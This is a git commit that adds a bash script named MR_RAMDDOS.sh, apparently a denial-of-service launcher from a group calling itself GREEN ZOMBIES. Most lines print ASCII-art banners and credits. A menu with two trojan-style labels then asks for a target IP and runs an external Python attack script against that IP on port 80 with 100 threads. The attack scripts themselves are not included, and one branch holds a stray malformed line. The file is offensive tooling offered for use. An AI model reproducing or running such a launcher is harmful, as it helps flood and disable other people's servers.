10e7e85ef7baa31ec791dba4296567891db99c61
greenzombies123 <52916652+greenzombies123@users.noreply.github.com>
2019-08-24 20:02:48 +0700

    Add files via upload

---
+++ MR_RAMDDOS.sh
@@ -0,0 +1,132 @@
+blue='\033[34;1m'
+green='\033[32;1m'  
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+clear
+echo
+echo
+echo
+echo
+echo
+echo $green"@@@@@@@@@@   @@@@@@@                  @@@@@@@    @@@@@@   @@@@@@@@@@   "
+sleep 1
+echo $green"@@@@@@@@@@@  @@@@@@@@                 @@@@@@@@  @@@@@@@@  @@@@@@@@@@@  "
+sleep 1
+echo $green"@@! @@! @@!  @@!  @@@                 @@!  @@@  @@!  @@@  @@! @@! @@!  "
+sleep 1
+echo $green"!@! !@! !@!  !@!  @!@                 !@!  @!@  !@!  @!@  !@! !@! !@!  "
+sleep 1
+echo $green"@!! !!@ @!@  @!@!!@!                  @!@!!@!   @!@!@!@!  @!! !!@ @!@  "
+echo $white"!@!   ! !@!  !!@!@!                   !!@!@!    !!!@!!!!  !@!   ! !@!  "
+echo $white"!!:     !!:  !!: :!!                  !!: :!!   !!:  !!!  !!:     !!:  "
+sleep 1
+echo $white":!:     :!:  :!:  !:!                 :!:  !:!  :!:  !:!  :!:     :!:  "
+echo $white":::     ::   ::   :::  :::::::::::::  ::   :::  ::   :::  :::     ::  "
+echo $white" :      :     :   : :  :::::::::::::   :   : :   :   : :   :      : "
+sleep 1
+echo
+echo
+echo $green"___________________________________________________"
+sleep 1
+echo $green" [+]"$white"Author by      "$green": MR_RAM "
+echo $green" [+]"$white"Team           "$green": GREEN ZOMBIES         "
+sleep 1
+echo $green" [+]"$white"Thanks to      "$green": XCR=404"
+echo $green" [+]"$white"Thanks to      "$green": Blue Sky"
+echo $green" [+]"$white"Thanks to      "$green": DNA_26"
+sleep 1
+echo $green"___________________________________________________"
+echo
+echo
+echo
+echo $green"________________________________________"
+sleep 1
+echo
+echo $pwhite"                 LIST"
+sleep 1
+echo
+echo $green"________________________________________"
+echo
+sleep 1
+echo $green"[1]"$white".TROJAN WIN32,64.NT"
+echo $green"[2]"$white".ANDROMEDA XR"
+echo
+echo $green"________________________________________"
+echo $white"MASUKAN PILIHAN ANDA"
+read -p "PILIH>>==>" bro;
+echo
+if [ $bro = 1 ] || [ $bro = 1 ]
+then
+clear
+echo $green"@@@@@@@@@@   @@@@@@@                  @@@@@@@    @@@@@@   @@@@@@@@@@   "
+echo $green"@@@@@@@@@@@  @@@@@@@@                 @@@@@@@@  @@@@@@@@  @@@@@@@@@@@  "
+sleep 1
+echo $green"@@! @@! @@!  @@!  @@@                 @@!  @@@  @@!  @@@  @@! @@! @@!  "
+sleep 1
+echo $green"!@! !@! !@!  !@!  @!@                 !@!  @!@  !@!  @!@  !@! !@! !@!  "
+sleep 1
+echo $green"@!! !!@ @!@  @!@!!@!                  @!@!!@!   @!@!@!@!  @!! !!@ @!@  "
+echo $white"!@!   ! !@!  !!@!@!                   !!@!@!    !!!@!!!!  !@!   ! !@!  "
+echo $white"!!:     !!:  !!: :!!                  !!: :!!   !!:  !!!  !!:     !!:  "
+sleep 1
+echo $white":!:     :!:  :!:  !:!                 :!:  !:!  :!:  !:!  :!:     :!:  "
+echo $white":::     ::   ::   :::  :::::::::::::  ::   :::  ::   :::  :::     ::  "
+echo $white" :      :     :   : :  :::::::::::::   :   : :   :   : :   :      : "
+sleep 1
+echo
+echo
+echo $green"___________________________________________________"
+sleep 1
+echo $green" [+]"$white"Author by      "$green": MR_RAM "
+echo $green" [+]"$white"Team           "$green": GREEN ZOMBIES         "
+sleep 1
+echo $green" [+]"$white"Thanks to      "$green": XCR=404"
+echo $green" [+]"$white"Thanks to      "$green": Blue Sky"
+echo $green" [+]"$white"Thanks to      "$green": DNA_26"
+sleep 1
+echo $green"___________________________________________________"
+echo $red"MASUKAN IP TARGET"
+read -p "===>" ipt
+clear
+echo
+python win.32.64.NT.py -s$ipt -p80 -t100
+fi
+
+if [ $bro = 2 ] || [ $bro = 2 ]
+then
+>
+echo $green"@@@@@@@@@@@  @@@@@@@@                 @@@@@@@@  @@@@@@@@  @@@@@@@@@@@  "
+sleep 1
+echo $green"@@! @@! @@!  @@!  @@@                 @@!  @@@  @@!  @@@  @@! @@! @@!  "
+sleep 1
+echo $green"!@! !@! !@!  !@!  @!@                 !@!  @!@  !@!  @!@  !@! !@! !@!  "
+sleep 1
+echo $green"@!! !!@ @!@  @!@!!@!                  @!@!!@!   @!@!@!@!  @!! !!@ @!@  "
+echo $white"!@!   ! !@!  !!@!@!                   !!@!@!    !!!@!!!!  !@!   ! !@!  "
+echo $white"!!:     !!:  !!: :!!                  !!: :!!   !!:  !!!  !!:     !!:  "
+sleep 1
+echo $white":!:     :!:  :!:  !:!                 :!:  !:!  :!:  !:!  :!:     :!:  "
+echo $white":::     ::   ::   :::  :::::::::::::  ::   :::  ::   :::  :::     ::  "
+echo $white" :      :     :   : :  :::::::::::::   :   : :   :   : :   :      : "
+sleep 1
+echo
+echo
+echo $green"___________________________________________________"
+sleep 1
+echo $green" [+]"$white"Author by      "$green": MR_RAM "
+echo $green" [+]"$white"Team           "$green": GREEN ZOMBIES         "
+sleep 1
+echo $green" [+]"$white"Thanks to      "$green": XCR=404"
+echo $green" [+]"$white"Thanks to      "$green": Blue Sky"
+echo $green" [+]"$white"Thanks to      "$green": DNA_26"
+sleep 1
+echo $green"___________________________________________________"
+echo $purple"MASUKAN IP TARGET"
+read -p "===>" ipt
+clear
+echo
+python andromeda.py -s$ipt -p80 -t100
+fi
